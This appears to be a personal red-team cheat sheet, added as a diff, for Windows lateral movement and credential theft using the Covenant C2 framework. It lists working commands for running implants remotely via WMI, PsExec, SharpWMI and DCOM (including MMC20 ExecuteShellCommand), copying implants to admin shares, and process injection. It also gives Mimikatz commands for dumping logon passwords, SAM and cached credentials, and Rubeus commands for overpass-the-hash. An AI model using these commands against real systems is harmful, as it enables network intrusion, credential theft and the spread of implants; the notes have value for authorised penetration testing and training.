@@ -1,0 +1,139 @@
+#Lateral Movement
+
+Windows Management Instrumentation (WMI) Covenant: 
+WMI 
+wmigrunt computer powershell user password
+wmic /node:"wkstn-4945" /user:"domain\user" /password:"REDACTED" process call create "powershell -enc [...snip...]"
+ReturnValue = 0; "Successful"
+PowerShell Remoting
+PsExec
+Crackmapexec
+
+#Works for me
+upload gruntsmb.exe c:\temp\upload
+go to c:\temp
+copy c:\temp \\hostname\c$\Users\x.exe
+wmicommnad hostname c:\Users\x.exe user pass
+connect hostname pipensmb
+
+SharpWMI
+SharpWMI /command:"action=exec computername=computer command=\"C:\Windows\Temp\GruntHTTP.exe\""
+
+#PowerShell Remoting
+PowerShellRemotingCommand target "whoami; hostname"
+PowerShellRemotingCommand target "whoami; hostname" domain user pass
+
+#PsExec
+psexec computer servicebinary
+connect computer pipen
+
+#DCOM
+DCOMCommand
+DCOMGrunt
+DCOMGrunt computer grunt
+shellwindows, shellbrowserwindow, exceldde and mmc20_application.
+
+#Hunting DCOM 
+HKEY_CLASSES_ROOT\CLSID.
+Get-ChildItem -Path Registry::HKCR\CLSID -Name | select -First 5
+Get-ChildItem -Path Registry::HKCR\CLSID -Name | select -Skip 1 | Out-File CLSIDs.txt
+gc .\CLSIDs.txt -First 5
+-----------------------------------------
+$CLSIDs = Get-Content .\CLSIDs.txt
+$OutFile = "ComMembers.txt"
+
+foreach ($CLSID in $CLSIDs)
+{
+    Write-Output $CLSID | Out-File $OutFile -Append
+    Write-Output "--------------------------------------" | Out-File $OutFile -Append
+    $Type = [System.Type]::GetTypeFromCLSID($CLSID)
+    $Instance = [System.Activator]::CreateInstance($Type)
+    $Instance | Get-Member | Out-File $OutFile -Append
+    Write-Output "" | Out-File $OutFile -Append
+}
+
+ HKEY_CLASSES_ROOT\CLSID\{13709620-C279-11CE-A49E-444553540000},% SystemRoot%\system32\shell32.dll
+ %SystemRoot%\system32\mmc.exe
+PS C:\Windows\system32> $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889", "10.10.120.1"))
+PS C:\Windows\system32> $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", "", "/c calc", "")
+$com.Document.ActiveView.Document.ActiveView.Document.ActiveView | Get-Member
+
+#Session IDs
+ProcessList / p
+Session 1 , 2 , 3 --- users
+Session 0 system
+If you are in session 0 sometimes you can not view somethings , the migrate to another process
+ps
+Inject 1234
+
+#ViewDrives
+Seatbelt MappedDrives 
+
+#LogonPasswords SafetyKatz
+Mimikatz sekurlsa::logonpasswords
+ntlm
+
+#Security Account Manager
+Mimikatz token::elevate lsadump::sam
+
+#Token Impersonation
+ImpersonateProcess and ImpersonateUser
+RevToSelf.
+
+#Domain Cached Credentials
+Mimikatz token::elevate lsadump::cache
+$DCC2$<iterations>#<username>#<hash>
+
+#MakeToken
+MakeToken user domain pass
+
+#Overpass-the-Hash
+Rubeus triage
+Repair ticketbase64 in on line
+MakeToken user domain basspass
+Rubeus triage
+Rubeus ptt /ticket:<base64-encoded-ticket>
+Rubeus triage 
+Rubeus triage
+
+#Process Injection
+Inject
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+ 
+
+
+
+
+
+
